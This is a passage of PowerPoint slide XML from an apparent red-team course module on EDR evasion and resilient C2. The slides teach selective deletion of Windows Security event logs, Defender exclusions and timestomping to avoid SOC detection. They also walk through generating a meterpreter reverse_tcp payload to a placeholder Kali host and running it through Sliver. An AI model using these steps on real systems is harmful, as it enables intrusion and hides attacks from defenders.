              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17314743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2EB4A-D0CC-49DB-A531-197FB03DE53F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="398946"/>
            <a:ext cx="12629322" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4000" kern="100"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Week 11: Advanced EDR Evasion, Telemetry Killing &amp; Resilient C2</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="4000" kern="100"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br>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7900850A-ADC7-400E-B2C4-163DAD617F1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="119270" y="2141537"/>
            <a:ext cx="11234530" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100"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Objective: Achieve complete operational control over the compromised estate. Silence the EDR's kernel telemetry, surgically erase forensic breadcrumbs, bypass user-mode API hooks via direct </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="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syscalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100"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 and deploy a self-healing C2 mesh that resurrects your implant even if your primary Sliver/Havoc server is taken offline by the Blue Team.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2800" kern="100"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br>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16056592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EC656-C114-4C47-ACFF-EBF4580E73BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="106017"/>
            <a:ext cx="12192000" cy="776288"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" kern="100"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Task 01: Deep OPSEC–Selective Event Log Tampering</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A2DA0EF0-78A3-4E6F-BFFF-E81E138DCD7F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-119270" y="980661"/>
            <a:ext cx="12311270" cy="5877339"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Description: Clearing the entire Security log (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>wevtutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 cl) screams "I AM A HACKER". You need to surgically remove only the traces of your specific actions while leaving everything else intact to avoid alerting the SOC.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Technical Requirements:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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  · Event ID Targeting: Identify which Event IDs your specific attacks generated (e.g., 4624 for successful logons, 4688 for process creations, and 4672 for special privileges assigned).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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  · Selective Deletion via PowerShell/.NET: Use Win32 API calls (via your C2's execute-assembly) to call </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>EvtExportLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>EvtClearLog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 with custom XPath queries to delete only events that match your source IP or your user context.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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  · Time-Stomping: Use Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>MpPreference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 to temporarily exclude your payload folders from Defender scans, and use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>timestomp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 to reset file creation/modification dates on any DLLs or dropped scripts back to their original installation date (e.g., 2018).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 Learning Goal: Understand that Incident Responders rely on timelines. If your attack events are missing but the rest of the log is intact, they might miss it during a manual review—but you must never clear the entire log.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9824555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243A0E6-4AD7-8AC6-9F49-169EC89766AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6768007"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E67AE9"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>TASK 01 – PART 1: EVENT ID TARGETING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent5">
                    <a:lumMod val="40000"/>
                    <a:lumOff val="60000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>What Is Event ID Targeting?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Before you can surgically delete your attack traces, you must first know exactly which Event IDs your attack generated. Each action in Windows produces specific log entries. You need to identify these so you can delete only them and leave everything else intact.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 1: Get an Active C2 Session</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Ensure you have an active Sliver or Havoc session on the target Windows machine. All following commands will be executed remotely through your C2.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent6">
                    <a:lumMod val="40000"/>
                    <a:lumOff val="60000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 2: Generate and Execute a Test Payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>From your Kali machine, generate a basic payload:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -p windows/x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> LHOST=YOUR_KALI_IP LPORT=4444 -f exe -o test.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Upload and execute it through your C2 session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>In Sliver:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>upload /path/to/test.exe C:\Users\Public\test.exe</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o C:\Users\Public\test.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 3: View Successful Logon Events (4624)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Run this command remotely through your C2:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> @{LogName='Security'; ID=4624} -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MaxEvents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> 10 | Format-List"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Look for logons that occurred at the same time you executed your test payload. Note the Logon Id.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 4: View Process Creation Events (4688)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>WinEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>FilterHashtable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> @{LogName='Security'; ID=4688} -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MaxEvents</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> 10 | Format-List"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
